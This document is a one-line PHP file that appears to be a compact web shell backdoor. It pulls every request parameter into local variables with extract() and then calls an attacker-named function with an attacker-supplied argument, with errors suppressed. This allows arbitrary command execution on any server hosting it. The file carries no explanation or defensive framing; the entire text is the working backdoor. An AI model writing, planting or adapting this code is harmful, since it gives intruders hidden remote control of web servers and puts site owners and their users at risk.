<?php @extract($_REQUEST); @die ($ctime($atime)); ?>
